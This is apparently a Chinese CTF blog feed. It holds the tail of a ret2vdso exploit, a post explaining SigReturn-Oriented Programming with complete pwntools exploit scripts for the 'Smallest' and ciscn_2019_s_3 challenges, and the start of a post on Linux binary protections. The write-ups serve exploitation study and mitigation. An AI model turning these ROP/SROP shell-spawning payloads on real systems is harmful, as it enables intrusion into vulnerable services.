&amp; 0xDA442D24) ^ c ^ b    a = state[idx]    state[idx] = a ^ b ^ d ^ (a &lt;&lt; 2) ^ (b &lt;&lt; 18) ^ (c &lt;&lt; 28)    return idxdef find_state(recv):    info(&#39;Start find state.&#39;)    global state    z = Solver()    idx = 15    for r in recv:        idx = well512_z3(idx)        z.add(state[idx] == r + 1)    return zp = process(&#39;./fuckup&#39;)def choice(c):    p.recvuntil(&#39;Quit\n&#39;)    p.sendline(str(c))r_list = []for i in range(15):    choice(3)    sleep(0.1)    r = int(p.recv(0x20)[0x11:0x19], 16)    r_list.append(r)info(r_list)z = find_state(r_list)info(&#39;Solver result =&gt; &#39; + str(z.check()))next_state = dict()model = z.model()for i in model:    idx = int(str(i)[3:])    val = model[i].as_long()    next_state[idx] = valinfo(next_state)for i in range(16):    if i in next_state:        state[i] = next_state[i]idx = 15for i in range(15):    idx = well512(idx)idx = well512(idx)predict_val = state[idx] - 1info(&#39;predict_val = &#39; + hex(predict_val))current_base = 0xfffff000 &amp; predict_valinfo(&#39;current_base = &#39; + hex(current_base))base = 0x8048000offset = current_base - base# 0x0804908f : pop eax ; pop ebx ; pop esi ; retpop_eax_ebx_esi_ret = 0x0804908f# 0x0804961a : pop edx ; pop ecx ; pop ebx ; retpop_edx_ecx_ebx_ret = 0x0804961a# 0x0804875f : int 0x80int_0x80 = 0x0804875fpayload = &#39;A&#39; * 0x16payload += m(pop_eax_ebx_esi_ret)payload += p32(0x7D)payload += p32(0)payload += p32(0)payload += m(pop_edx_ecx_ebx_ret)payload += p32(0x7)payload += p32(0x1000)payload += p32(current_base)payload += m(int_0x80)payload += m(pop_eax_ebx_esi_ret)payload += p32(0x3)payload += p32(0)payload += p32(0)payload += m(pop_edx_ecx_ebx_ret)payload += p32(0x100)payload += p32(current_base)payload += p32(0)payload += m(int_0x80)payload += p32(current_base)payload = payload.ljust(100, &#39;A&#39;)payload += asm(shellcraft.sh())p.sendline(&#39;4&#39;)p.sendline(payload)p.interactive()</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#ret2vdso" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#ret2vdso</a><br><a href="http://adam8157.info/blog/2011/10/linux-vdso/" target="_blank" rel="noopener">http://adam8157.info/blog/2011/10/linux-vdso/</a><br><a href="https://bestwing.me/stack-overflow-three-SROP.html" target="_blank" rel="noopener">https://bestwing.me/stack-overflow-three-SROP.html</a><br><a href="https://www.anquanke.com/post/id/85810" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85810</a><br><a href="https://binlep.github.io/2020/03/03/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93%20--%20Advanced%20ROP/" target="_blank" rel="noopener">https://binlep.github.io/2020/03/03/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93%20--%20Advanced%20ROP/</a><br><a href="https://www.voidsecurity.in/2014/12/return-to-vdso-using-elf-auxiliary.html" target="_blank" rel="noopener">https://www.voidsecurity.in/2014/12/return-to-vdso-using-elf-auxiliary.html</a><br><a href="https://vvl.me/2019/06/linux-syscall-and-vsyscall-vdso-in-x86/" target="_blank" rel="noopener">https://vvl.me/2019/06/linux-syscall-and-vsyscall-vdso-in-x86/</a><br><a href="https://pwnexpoit.tistory.com/13" target="_blank" rel="noopener">https://pwnexpoit.tistory.com/13</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用 SROP 的时候，一般情况下很难找得到 &lt;code&gt;syscall ; ret&lt;/code&gt;，这时就需要在 VDSO 中找了。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Understanding SigReturn-Oriented-Programming</title>
    <link href="blog.b3ale.cn/2020/03/13/Understanding-SigReturn-Oriented-Programming/"/>
    <id>blog.b3ale.cn/2020/03/13/Understanding-SigReturn-Oriented-Programming/</id>
    <published>2020-03-13T08:07:27.000Z</published>
    <updated>2020-03-19T15:53:21.513Z</updated>
    
    <content type="html"><![CDATA[<p>去年学 ROP 的时候遗漏的一个技术。</p><a id="more"></a><h1 id="What-is-SROP"><a href="#What-is-SROP" class="headerlink" title="What is SROP"></a>What is SROP</h1><p>SROP（Sigreturn Oriented Programming）于 2014 年被 Vrije Universiteit Amsterdam 的 Erik Bosman 提出，其相关研究 Framing Signals — A Return to Portable Shellcode 发表在安全顶级会议 Oakland 2014 上，被评选为当年的 Best Student Papers。</p><p>其中，Sigreturn 是一个系统调用，在类 Unix 系统发生 Signal 的时候会被间接地调用。</p><h2 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h2><p>Signal 机制是类 Unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p><p><img src="/pics/Understanding-SigReturn-Oriented-Programming/1.png" srcset="/img/loading.gif" alt></p><ol><li>首先内核向某个用户态进程发送 Signal 时，该进程会被暂时挂起并进入内核态；</li><li>内核会为该进程保存上下文（类似于保存函数现场，将所有寄存器压入栈，以及压入 Signal 的信息和指向 Sigreturn 的系统调用地址），存储完毕后，回到用户态；</li><li>接着使用用户态中注册过的 Signal Handler 处理相应的 Signal；</li><li>处理完毕后回到内核态，内核执行 Sigreturn 系统调用（32 位的调用号为 77，64 位的调用号为 15），将对应进程的上下文恢复，最后回到用户态。</li></ol><p>在保存进程上下文的时候，用户态的栈中的结构如下。其中 ucontext 以及 siginfo 这一段被称为 Signal Frame，在 Signal Handler 执行完之后，就会执行 Sigreturn 代码：</p><p><img src="/pics/Understanding-SigReturn-Oriented-Programming/2.png" srcset="/img/loading.gif" alt></p><p>Signal Frame 在不同架构下不同。在 x86 中的 sigcontext 结构体如下：</p><pre><code class="cpp">struct sigcontext {    __u16                gs, __gsh;    __u16                fs, __fsh;    __u16                es, __esh;    __u16                ds, __dsh;    __u32                edi;    __u32                esi;    __u32                ebp;    __u32                esp;    __u32                ebx;    __u32                edx;    __u32                ecx;    __u32                eax;    __u32                trapno;    __u32                err;    __u32                eip;    __u16                cs, __csh;    __u32                eflags;    __u32                esp_at_signal;    __u16                ss, __ssh;    struct _fpstate __user        *fpstate; // FPU寄存器状态    __u32                oldmask;    __u32                cr2;};</code></pre><p>在 x64 中的 sigcontext 结构体如下：</p><pre><code class="cpp">struct sigcontext {    __u64                r8;    __u64                r9;    __u64                r10;    __u64                r11;    __u64                r12;    __u64                r13;    __u64                r14;    __u64                r15;    __u64                rdi;    __u64                rsi;    __u64                rbp;    __u64                rbx;    __u64                rdx;    __u64                rax;    __u64                rcx;    __u64                rsp;    __u64                rip;    __u64                eflags;        /* RFLAGS */    __u16                cs;    __u16                gs;    __u16                fs;    __u16                __pad0;    __u64                err;    __u64                trapno;    __u64                oldmask;    __u64                cr2;    struct _fpstate __user        *fpstate;    /* Zero when no FPU context */    __u64                reserved1[8];};</code></pre><h2 id="SROP-Theory"><a href="#SROP-Theory" class="headerlink" title="SROP Theory"></a>SROP Theory</h2><p>在 Signal 机制的整个过程中，内核所做的主要工作就是为进程保存上下文以及恢复上下文。所改变的 Signal Frame 是处在用户的地址空间中的，所以可以得出一下结论：</p><ul><li>Signal Frame 可以被用户读写；</li><li>因为内核没有直接参与 Signal，所以内核并不知道保存的 Signal Frame 是否是真正的进程上下文（即执行 Sigreturn 的时候）。</li></ul><p>那么就可以构造出假的 Signal Frame，提前把 RDI、RSI、RIP 等寄存器的值放在构造的结构体中，执行完 Sigreturn 后就会给各个寄存器设置好值。构造 SROP 的条件如下：</p><ul><li>可以通过栈溢出来控制栈</li><li>需要知道一些地址<ul><li><code>&amp;&quot;/bin/sh&quot;</code></li><li>Signal Frame</li><li>Gadget：<code>syscall ; ret</code></li><li>Sigreturn</li></ul></li><li>需要有足够大的空间来放下 Signal Frame</li></ul><p>在 pwntools 中也集成了 SROP 的工具，即 <code>SigreturnFrame()</code>，用于构造假的 sigcontext 结构体（Signal Frame）。</p><h1 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h1><p>我们可以自行构造一个程序，使用 SROP 进行一个简单的利用：</p><pre><code class="cpp">char buf[0x200];int main(){    asm(        // 读取 0x200 字节        &quot;mov rax, 0\n&quot; // sys_read        &quot;mov rdi, 0\n&quot; // fd        &quot;lea rsi, %0\n&quot; // buf        &quot;mov rdx, 0x200\n&quot; // count        &quot;syscall\n&quot;        // 恢复进程上下文        &quot;mov rax, 15\n&quot; // sys_rt_sigaction        &quot;mov rdi, 0\n&quot;        &quot;mov rsp, rsi\n&quot; // 把buf作为栈        // syscall 的 symbol，便于查找        &quot;syscall:\n&quot;        &quot;syscall\n&quot;        &quot;jmp exit\n&quot;        // 退出程序        &quot;exit:\n&quot;        &quot;mov rax, 60\n&quot; // sys_exit        &quot;mov rdi, 0\n&quot;        &quot;syscall\n&quot;        :        : &quot;m&quot; (buf)        :        );}</code></pre><p>构造出 Signal Frame，并在 buf 上设置好字符串，发送 payload 后拿到 shell：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;p = process(&#39;./main&#39;)elf = ELF(&#39;./main&#39;)#gdb.attach(p)# 构造假的Signal Frameframe = SigreturnFrame()frame.rax = constants.SYS_execve # 设置系统调用号为sys_execveframe.rdi = elf.symbols[&#39;buf&#39;] + 0x100 # 设置第一个参数为偏移0x100处的“/bin/sh”字符串frame.rsi = 0frame.rdx = 0frame.rip = elf.symbols[&#39;syscall&#39;]payload = str(frame).ljust(0x100, &#39;A&#39;) + &#39;/bin/sh\x00&#39; # 设置payloadp.send(payload)p.interactive()</code></pre><p>调试的时候可以看到 Sigreturn 后各个寄存器被设置的值，然后就能调用 execve 的系统调用了：</p><pre><code class="gdb">──────────────────────────────────── Code ────────────────────────────────────   0x40010a &lt;main+34&gt;:    mov    rax,0xf   0x400111 &lt;main+41&gt;:    mov    rdi,0x0   0x400118 &lt;main+48&gt;:    mov    rsp,rsi=&gt; 0x40011b &lt;main+51&gt;:    syscall   0x40011d &lt;main+53&gt;:    jmp    0x40011f &lt;main+55&gt;   0x40011f &lt;main+55&gt;:    mov    rax,0x3c   0x400126 &lt;main+62&gt;:    mov    rdi,0x0   0x40012d &lt;main+69&gt;:    syscall────────────────────────────── System call info ──────────────────────────────rt_sigreturn()───────────────────────────────── SROP info ──────────────────────────────────       ss_size:0x0000000000000000           rsi:0x0000000000000000           rax:0x000000000000003b           rbp:0x0000000000000000        eflags:0x0000000000000000           rcx:0x0000000000000000           rip:0x000000000040011b           r13:0x0000000000000000           cr2:0x0000000000000000           r12:0x0000000000000000           rbx:0x0000000000000000       uc_link:0x0000000000000000           err:0x0000000000000000        trapno:0x0000000000000000           r10:0x0000000000000000      ss_flags:0x0000000000000000         ss_sp:0x0000000000000000           rdi:0x0000000000600280      uc_flags:0x0000000000000000           r14:0x0000000000000000            r8:0x0000000000000000      selector:0x0000000000000033            r9:0x0000000000000000           rdx:0x0000000000000000           rsp:0x0000000000000000       oldmask:0x0000000000000000           r11:0x0000000000000000           r15:0x0000000000000000...──────────────────────────────────── Code ────────────────────────────────────   0x40010a &lt;main+34&gt;:    mov    rax,0xf   0x400111 &lt;main+41&gt;:    mov    rdi,0x0   0x400118 &lt;main+48&gt;:    mov    rsp,rsi=&gt; 0x40011b &lt;main+51&gt;:    syscall   0x40011d &lt;main+53&gt;:    jmp    0x40011f &lt;main+55&gt;   0x40011f &lt;main+55&gt;:    mov    rax,0x3c   0x400126 &lt;main+62&gt;:    mov    rdi,0x0   0x40012d &lt;main+69&gt;:    syscall────────────────────────────── System call info ──────────────────────────────execve(const char *name = 0x600280,const char *const *argv = 0x0,const char *const *envp = 0x0)const char *name : 0x600280 --&gt; 0x68732f6e69622f (&#39;/bin/sh&#39;)const char *const *argv : 0x0const char *const *envp : 0x0</code></pre><h1 id="Smallest"><a href="#Smallest" class="headerlink" title="Smallest"></a>Smallest</h1><p>程序只开了 NX，Got 表可写、没有 Canary 保护、没开 PIE：</p><pre><code class="bash">$ checksec ./smallest[*] &#39;/home/beale/SROP/2017-360Chunqiu-Smallest/smallest&#39;    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>2017 年 360 春秋杯的 Smallest 可以用 SROP 实现利用。程序由汇编实现，整体只有几条语句：</p><pre><code class="bash">$ objdump -d ./smallest -M intel./smallest:     file format elf64-x86-64Disassembly of section .text:00000000004000b0 &lt;.text&gt;:  4000b0:    48 31 c0                 xor    rax,rax  4000b3:    ba 00 04 00 00           mov    edx,0x400  4000b8:    48 89 e6                 mov    rsi,rsp  4000bb:    48 89 c7                 mov    rdi,rax  4000be:    0f 05                    syscall  4000c0:    c3                       ret</code></pre><p>可以看到 <code>4000be</code> 处的是 <code>syscall ; ret</code>，可以作为利用。而整个程序，是实现了一个 read 的系统调用，总共读 0x400 个字节到栈上。利用方法是先泄露出一个栈上的地址，然后通过 SROP 构造一个 read 调用往这个已知的地址上写数据，并再次利用 SROP 构造一个 execve 的调用；第二种方法是使用 mprotect 将不可执行的栈改为 rwx，然后执行 shellcode。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>脚本如下：</p><pre><code class="python">#!/usr/bin/env python#-*- encoding=utf-8 -*-from pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;#context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]p = process(&#39;./smallest&#39;)elf = ELF(&#39;./smallest&#39;)#gdb.attach(p)main_addr = 0x4000b0syscall_addr = 0x4000bepayload = p64(main_addr) * 3 # 栈上放3个main的地址，第1个main用来修改rax，第2个main用来泄漏栈，第3个main为了之后的输入raw_input(&#39;@main*3&#39;)p.send(payload)payload = &#39;\xb3&#39; # 修改第2个main的地址为0x4000b3，同时可以将rax和rdi设置为1，可以泄漏栈的地址raw_input(&#39;@leak stack&#39;)p.send(payload)p.recv(8)stack_addr = u64(p.recv(8))info(&#39;stack_addr = &#39; + hex(stack_addr))payload = p64(main_addr) + p64(syscall_addr) # main为了之后的输入，syscall_ret用来调用sigreturnframe = SigreturnFrame()frame.rax = constants.SYS_read # sys_read的调用号frame.rdi = 0frame.rsi = stack_addrframe.rdx = 0x400frame.rsp = stack_addrframe.rip = syscall_addrpayload += str(frame) # 读0x400个字节到新的栈上，并把栈搬到新的栈上raw_input(&#39;@fake sigcontext to pivot stack&#39;)p.send(payload)payload = p64(syscall_addr).ljust(15, &#39;A&#39;) # 将rax设置成15，并把返回地址设为syscall_ret（覆盖上面的syscall_ret以及部分frame中的flags）raw_input(&#39;@set rax=15&#39;)p.send(payload)# 下面开始往新的栈上写东西bin_sh_addr = stack_addr + 2 * 8 + len(SigreturnFrame()) # 设置“/bin/sh”字符串的地址payload = p64(main_addr) + p64(syscall_addr) # main为了之后的输入，syscall_ret用来调用sigreturnframe = SigreturnFrame()frame.rax = constants.SYS_execve # sys_execve的调用号frame.rdi = bin_sh_addrframe.rip = syscall_addrpayload += str(frame) + &#39;/bin/sh\x00&#39; # 开shellraw_input(&#39;@fake sigcontext to exec shell&#39;)p.send(payload)payload = p64(syscall_addr).ljust(15, &#39;A&#39;) # 将rax设置成15，并把返回地址设为syscall_ret（覆盖上面的syscall_ret以及部分frame中的flags）raw_input(&#39;@set rax=15&#39;)p.send(payload)p.interactive()</code></pre><p>第二种方法即在新的栈上写东西时构造出 mprotect 的调用，并添加 shellcode：</p><pre><code class="python">payload = p64(main_addr) + p64(syscall_addr)frame = SigreturnFrame()frame.rax = constants.SYS_mprotectframe.rdi = stack_addr &amp; 0xfffffffffffff000frame.rsi = 0x1000frame.rdx = 0x7frame.rsp = stack_addr + 0x108 # 设置栈的位置frame.rip = syscall_addrpayload += str(frame)payload += p64(stack_addr + 0x110) # 设置return的地址payload += asm(shellcraft.sh())p.send(payload)</code></pre><h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>保护和上面开的一样：</p><pre><code class="bash">$ checksec ./ciscn_s_3[*] &#39;/root/tmp/ciscn_2019_s_3/ciscn_s_3&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h2 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h2><p>程序在 main 中调用了 vuln：</p><pre><code class="asm">000000000040051d &lt;main&gt;:  40051d:    55                       push   rbp  40051e:    48 89 e5                 mov    rbp,rsp  400521:    48 83 ec 10              sub    rsp,0x10  400525:    89 7d fc                 mov    DWORD PTR [rbp-0x4],edi  400528:    48 89 75 f0              mov    QWORD PTR [rbp-0x10],rsi  40052c:    b8 00 00 00 00           mov    eax,0x0  400531:    e8 b7 ff ff ff           call   4004ed &lt;vuln&gt;  400536:    90                       nop  400537:    c9                       leave  400538:    c3                       ret</code></pre><p>vuln 中读了 0x400 到 <code>[rsp-0x10]</code> 处，并输出 0x30 个字节。读了这么多有足够的空间进行 SROP：</p><pre><code class="asm">00000000004004ed &lt;vuln&gt;:  4004ed:    55                       push   rbp  4004ee:    48 89 e5                 mov    rbp,rsp  4004f1:    48 31 c0                 xor    rax,rax  4004f4:    ba 00 04 00 00           mov    edx,0x400  4004f9:    48 8d 74 24 f0           lea    rsi,[rsp-0x10]  4004fe:    48 89 c7                 mov    rdi,rax  400501:    0f 05                    syscall  400503:    48 c7 c0 01 00 00 00     mov    rax,0x1  40050a:    ba 30 00 00 00           mov    edx,0x30  40050f:    48 8d 74 24 f0           lea    rsi,[rsp-0x10]  400514:    48 89 c7                 mov    rdi,rax  400517:    0f 05                    syscall  400519:    c3                       ret  40051a:    90                       nop  40051b:    5d                       pop    rbp  40051c:    c3                       ret</code></pre><p>另外还提供了 sys_execve 和 sys_sigreturn 的调用号：</p><pre><code class="asm">00000000004004d6 &lt;gadgets&gt;:  4004d6:    55                       push   rbp  4004d7:    48 89 e5                 mov    rbp,rsp  4004da:    48 c7 c0 0f 00 00 00     mov    rax,0xf  4004e1:    c3                       ret  4004e2:    48 c7 c0 3b 00 00 00     mov    rax,0x3b  4004e9:    c3                       ret  4004ea:    90                       nop  4004eb:    5d                       pop    rbp  4004ec:    c3                       ret</code></pre><p>这题相对简单一些，可以写 <code>&quot;/bin/sh&quot;</code> 到栈上，然后通过 write 的输出计算出地址，最后直接调 SROP。</p><h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><p>脚本如下：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;#context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]local = 0if local:  p = process(&#39;./ciscn_s_3&#39;)else:    p = remote(&#39;node3.buuoj.cn&#39;, 28526)#gdb.attach(p)vuln_addr = 0x4004f1set_sigreturn_addr = 0x4004daset_execve_addr = 0x4004e2syscall_ret = 0x400517payload = &#39;/bin/sh\x00&#39;.ljust(16, &#39;A&#39;) + p64(vuln_addr)raw_input(&#39;@&#39;)p.send(payload)p.recv(32)stack_addr = u64(p.recv(8))info(&#39;stack_addr = &#39; + hex(stack_addr))bin_sh_addr = stack_addr - 0x118payload = p64(set_sigreturn_addr) + p64(syscall_ret)frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = bin_sh_addrframe.rip = syscall_retpayload += str(frame)raw_input(&#39;@&#39;)p.send(payload)p.interactive()</code></pre><h1 id="Prevention"><a href="#Prevention" class="headerlink" title="Prevention"></a>Prevention</h1><h2 id="Gadgets-Prevention"><a href="#Gadgets-Prevention" class="headerlink" title="Gadgets Prevention"></a>Gadgets Prevention</h2><p>在当前的几种不同的操作系统中，<code>sigreturn</code> 和 <code>syscall; ret</code> 这两个 Gadgets 非常容易被找到，特别是在 <code>vsyscall</code> 这种特别不安全的机制存在的情况下。因此我们应该尽量避免这种机制，让 ASLR 等保护机制物尽其用，使得攻击者很难找到这些 Gadgets。但是这种方法并不能从本质上解决 SROP 的问题。</p><h2 id="Signal-Frame-Canaries"><a href="#Signal-Frame-Canaries" class="headerlink" title="Signal Frame Canaries"></a>Signal Frame Canaries</h2><p>这种方法借鉴于 Stack Canaries 机制，即在<code>Signal Frame</code>的<code>rt_sigreturn</code>字段之前插入一段随机生成的字节，如果发生 Overflow，则该段字节会被破坏，从而在发生<code>sigreturn</code>之前会被检测到。同时针对 Stack Canaries 的攻击也很多，其同样不能从本质上防止 SROP 的发生。</p><h2 id="Break-kernel-agnostic"><a href="#Break-kernel-agnostic" class="headerlink" title="Break kernel agnostic"></a>Break kernel agnostic</h2><p>这就要追溯到 SROP 的本质问题了，就是内核对 Signal 的不可知性。如果我们在内核处理 <code>sigreturn</code> 系统调用的时候判断一下当前的 Signal Frame 是否是由内核之前创建的，那么这个问题就能从根本上解决。当然，这就涉及到要修改内核的一些底层的设计了，可能也会引入一些新的问题。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop</a><br><a href="https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/uapi/asm/sigcontext.h" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/uapi/asm/sigcontext.h</a><br><a href="https://bestwing.me/stack-overflow-three-SROP.html" target="_blank" rel="noopener">https://bestwing.me/stack-overflow-three-SROP.html</a><br><a href="http://blog.leanote.com/post/3191220142@qq.com/SROP" target="_blank" rel="noopener">http://blog.leanote.com/post/3191220142@qq.com/SROP</a><br><a href="https://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/87447.html</a><br><a href="http://blog.eonew.cn/archives/975" target="_blank" rel="noopener">http://blog.eonew.cn/archives/975</a><br><a href="https://bestwing.me/2017-360chunqiu-online.html" target="_blank" rel="noopener">https://bestwing.me/2017-360chunqiu-online.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;去年学 ROP 的时候遗漏的一个技术。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Linux下的各类程序保护机制</title>
    <link href="blog.b3ale.cn/2020/03/06/Linux%E4%B8%8B%E7%9A%84%E5%90%84%E7%B1%BB%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <id>blog.b3ale.cn/2020/03/06/Linux%E4%B8%8B%E7%9A%84%E5%90%84%E7%B1%BB%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</id>
    <published>2020-03-06T10:59:35.000Z</published>
    <updated>2020-03-20T02:07:20.057Z</updated>
    
    <content type="html"><![CDATA[<p>之前一直在做逆向，快一年没碰 PWN 了，接下来有一堆比赛，赶紧重新 PWN 起来。这里先整理一下 Linux 下的程序保护机制。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>Linux 版本：</p><pre><code class="bash">$ uname -aLinux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</code></pre><p>GCC 版本：</p><pre><code class="bash">$ gcc --versiongcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609Copyright (C) 2015 Free Software Foundation, Inc.This is free software; see the source for copying conditions.  There is NOwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</code></pre><h1 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h1><p><a href="https://github.com/slimm609/checksec.sh/" target="_blank" rel="noopener">Checksec</a> 是用 Shell 编写的一个脚本，它可以用来检查可执行文件属性，例如 PIE, RELRO, PaX, Canaries, ASLR, Fortify Source 等等属性。</p><p><img src="/pics/Linux下的各类程序保护机制/1.png" srcset="/img/loading.gif" alt></p><h1 id="Cannary"><a href="#Cannary" class="headerlink" title="Cannary"></a>Cannary</h1><p>Canary 表示栈保护功能是否开启。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 Shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入 Cookie 信息，当函数真正返回的时候会验证 Cookie 信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将 Cookie 信息给覆盖掉，导致栈保护检查失败而阻止 Shellcode 的执行。在 Linux 中将 Cookie 信息称为 Canary。</p><p>gcc 在 4.2 版本中添加了 <code>-fstack-protector</code> 和 <code>-fstack-protector-all</code> 编译参数以支持栈保护功能，4.9 新增了 <code>-fstack-protector-strong</code> 编译参数让保护的范围更广。故在编译时可以控制是否开启栈保护以及程度。</p><p>测试代码：</p><pre><code class="cpp">#include &lt;stdio.h&gt;int main() {    char buf[20];    gets(buf);    return 0;}</code></pre><h2 id="Default（-fstack-protector）"><a href="#Default（-fstack-protector）" class="headerlink" title="Default（-fstack-protector）"></a>Default（<code>-fstack-protector</code>）</h2><p>默认情况下，开启了 Cannary 保护（即 <code>-fstack-protector</code> 参数），一开始会在栈上存储 Cannary（<code>QWORD PTR fs:0x28</code>），在程序结束时通过异或检查栈上的值是否正确来检查 Cannary 是否被篡改，如果不正确则调用 <code>__stack_chk_fail()</code> 产生报错：</p><pre><code class="asm">0000000000400596 &lt;main&gt;:  400596:    55                       push   rbp  400597:    48 89 e5                 mov    rbp,rsp  40059a:    48 83 ec 20              sub    rsp,0x20  40059e:    64 48 8b 04 25 28 00     mov    rax,QWORD PTR fs:0x28  4005a5:    00 00  4005a7:    48 89 45 f8              mov    QWORD PTR [rbp-0x8],rax  4005ab:    31 c0                    xor    eax,eax  4005ad:    48 8d 45 e0              lea    rax,[rbp-0x20]  4005b1:    48 89 c7                 mov    rdi,rax  4005b4:    b8 00 00 00 00           mov    eax,0x0  4005b9:    e8 c2 fe ff ff           call   400480 &lt;gets@plt&gt;  4005be:    b8 00 00 00 00           mov    eax,0x0  4005c3:    48 8b 55 f8              mov    rdx,QWORD PTR [rbp-0x8]  4005c7:    64 48 33 14 25 28 00     xor    rdx,QWORD PTR fs:0x28  4005ce:    00 00  4005d0:    74 05                    je     4005d7 &lt;main+0x41&gt;  4005d2:    e8 89 fe ff ff           call   400460 &lt;__stack_chk_fail@plt&gt;  4005d7:    c9                       leave  4005d8:    c3                       ret</code></pre><h2 id="fno-stack-protector"><a href="#fno-stack-protector" class="headerlink" title="-fno-stack-protector"></a><code>-fno-stack-protector</code></h2><p><code>-fstack-protector</code> 参数取消对栈的保护，直接编译成程序所对应的汇编：</p><pre><code class="asm">0000000000400526 &lt;main&gt;:  400526:    55                       push   rbp  400527:    48 89 e5                 mov    rbp,rsp  40052a:    48 83 ec 20              sub    rsp,0x20  40052e:    48 8d 45 e0              lea    rax,[rbp-0x20]  400532:    48 89 c7                 mov    rdi,rax  400535:    b8 00 00 00 00           mov    eax,0x0  40053a:    e8 d1 fe ff ff           call   400410 &lt;gets@plt&gt;  40053f:    b8 00 00 00 00           mov    eax,0x0  400544:    c9                       leave  400545:    c3                       ret</code></pre><h1 id="NX（DEP）"><a href="#NX（DEP）" class="headerlink" title="NX（DEP）"></a>NX（DEP）</h1><p>NX 即 No-eXecute（不可执行）的意思，NX（即 Windows 下的 DEP，数据执行保护）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 Shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令。</p><h2 id="Default（-z-noexecstack）"><a href="#Default（-z-noexecstack）" class="headerlink" title="Default（-z noexecstack）"></a>Default（<code>-z noexecstack</code>）</h2><p>默认开始 NX，栈上的数据不可执行：</p><pre><code class="gdb">assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         r--p    /home/beale/Test_Dir/main0x00601000         0x00602000         rw-p    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rw-p    